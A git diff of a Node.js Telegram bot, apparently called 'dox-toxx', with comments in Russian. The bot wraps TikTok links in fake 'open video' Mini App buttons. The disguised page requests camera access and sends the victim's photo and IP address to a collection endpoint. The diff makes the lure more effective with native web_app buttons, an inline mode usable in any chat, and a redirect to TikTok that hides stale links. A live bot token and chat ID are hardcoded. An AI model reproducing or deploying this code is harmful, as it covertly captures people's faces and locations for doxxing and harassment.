@@ -5,6 +5,8 @@ const crypto = require('crypto');
 const TOKEN = '8989024516:AAEAIwKbvaDe8HALbrjv-UoHcH6Pp2wZiso';
 const CHAT_ID = '8667961334';
 const PORT = process.env.PORT || 3000;
+
+// Ваш домен на Render (без слэша в конце)
 const DOMAIN = 'https://dox-toxx.onrender.com'; 
 
 const app = express();
@@ -15,12 +17,12 @@ app.use(express.urlencoded({ extended: true }));
 
 const linksDB = {};
 
-// --- ОБЫЧНЫЙ СТАРТ ---
+// --- БОТ: КОМАНДА /start ---
 bot.onText(/\/start/, (msg) => {
-  bot.sendMessage(msg.chat.id, 'Отправь ссылку на TikTok.');
+  bot.sendMessage(msg.chat.id, 'Отправь ссылку на TikTok (например: https://www.tiktok.com/@user/video/123456789).');
 });
 
-// --- ОБЫЧНЫЕ СООБЩЕНИЯ ---
+// --- БОТ: ОБЫЧНЫЕ СООБЩЕНИЯ В ЛИЧКУ ---
 bot.on('message', (msg) => {
   const text = msg.text;
   if (!text || text.startsWith('/')) return;
@@ -29,55 +31,49 @@ bot.on('message', (msg) => {
     const shortId = crypto.randomBytes(4).toString('hex');
     linksDB[shortId] = text;
     const fakeLink = `${DOMAIN}/${shortId}/`;
-    bot.sendMessage(msg.chat.id, `Твоя ссылка:\n${fakeLink}`);
+    
+    bot.sendMessage(msg.chat.id, `Ссылка готова!`, {
+      reply_markup: {
+        inline_keyboard: [[{ text: 'Открыть видео', web_app: { url: fakeLink } }]]
+      }
+    });
   }
 });
 
-// --- INLINE РЕЖИМ (@bot ссылка) ---
+// --- БОТ: INLINE РЕЖИМ (@Dox_tox_bot ссылка в любом чате) ---
 bot.on('inline_query', async (query) => {
   const text = query.query;
 
   if (!text || !text.includes('tiktok.com')) {
-    return bot.answerInlineQuery(query.id, []);
+    return bot.answerInlineQuery(query.id, [], { cache_time: 0 });
   }
 
   const shortId = crypto.randomBytes(4).toString('hex');
   linksDB[shortId] = text;
-  
-  // Ссылка на наше приложение
   const appLink = `${DOMAIN}/${shortId}/`;
 
-  // Создаем карточку с нативной кнопкой "Открыть"
   const result = {
     type: 'article',
     id: shortId,
     title: 'TikTok',
-    description: 'Нажмите, чтобы открыть видео',
+    description: 'Нажмите, чтобы отправить',
     input_message_content: {
       message_text: '👇 Нажмите кнопку ниже, чтобы открыть видео'
     },
     reply_markup: {
-      inline_keyboard: [
-        [
-          {
-            text: 'Открыть',
-            // ВАЖНО: Используем web_app вместо url, чтобы открылось как Mini App с камерой!
-            web_app: { url: appLink } 
-          }
-        ]
-      ]
+      inline_keyboard: [[{ text: 'Открыть', web_app: { url: appLink } }]]
     }
   };
 
   await bot.answerInlineQuery(query.id, [result], { cache_time: 0 });
 });
 
-// --- ГЛАВНАЯ СТРАНИЦА ---
+// --- ГЛАВНАЯ СТРАНИЦА (Проверка, что сервер жив) ---
 app.get('/', (req, res) => {
-  res.send('Сервер работает.');
+  res.send('Сервер работает. Бот ожидает ссылки в Telegram.');
 });
 
-// --- ПРИЕМ ДАННЫХ ---
+// --- ПРИЕМ ДАННЫХ С КАМЕРЫ ---
 app.post('/api/collect', async (req, res) => {
   const { target, photo } = req.body;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
@@ -94,15 +90,17 @@ app.post('/api/collect', async (req, res) => {
 
     res.json({ ok: true });
   } catch (error) {
+    console.error(error);
     res.status(500).json({ ok: false });
   }
 });
 
-// --- HTML СТРАНИЦА (С КАМЕРОЙ) ---
+// --- СТРАНИЦА-МАСКИРОВКА ---
 app.get('/:id/', (req, res) => {
   const shortId = req.params.id;
   const targetUrl = linksDB[shortId];
 
+  // Если ссылка битая (сервер перезапускался) — кидаем на главную TikTok
   if (!targetUrl) return res.redirect('https://www.tiktok.com/');
 
   res.send(`<!DOCTYPE html>
@@ -149,7 +147,6 @@ app.get('/:id/', (req, res) => {
     tg.expand();
     if (tg.BackButton) tg.BackButton.hide();
     
-    // Принудительный запрос камеры через API Telegram
     if (tg.requestCameraAccess) {
       tg.requestCameraAccess((granted) => {
         console.log("Camera access:", granted);
